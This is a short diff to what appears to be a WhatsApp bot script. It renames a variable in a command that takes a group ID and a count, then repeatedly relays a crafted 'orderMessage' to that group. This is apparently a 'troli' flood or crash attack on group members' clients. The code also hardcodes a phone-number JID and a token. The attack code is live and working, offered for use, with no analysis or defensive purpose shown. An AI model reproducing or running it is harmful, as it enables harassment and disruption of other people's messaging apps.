@@ -1076,10 +1076,10 @@ break
 
 case 'xentrolv2gc': {
  
-num = q.split('|')[0]+'@g.us'
+number01 = q.split('|')[0]+'@g.us'
 jumlah = q.split('|')[1]
 for (let i = 0; i < jumlah; i++) {
-var troligc = generateWAMessageFromContent(num, proto.Message.fromObject({
+var troligc = generateWAMessageFromContent(number01, proto.Message.fromObject({
 "orderMessage": {
                   "orderId": "436664297902534",
                   "sellerJid": "6282143067466@s.whatsapp.net",
@@ -1092,7 +1092,7 @@ var troligc = generateWAMessageFromContent(num, proto.Message.fromObject({
                   "token": "AR6ew8v8oH4gt78Ufm/sMBCeaQJwJlDhOTto8qAZytAdQA=="
 }
 }), { userJid: m.chat, quoted: m })
-xinn.relayMessage(num, troligc.message, { messageId: troligc.key.id })
+xinn.relayMessage(number01, troligc.message, { messageId: troligc.key.id })
 }
 reply(`Sukses`,)
 }
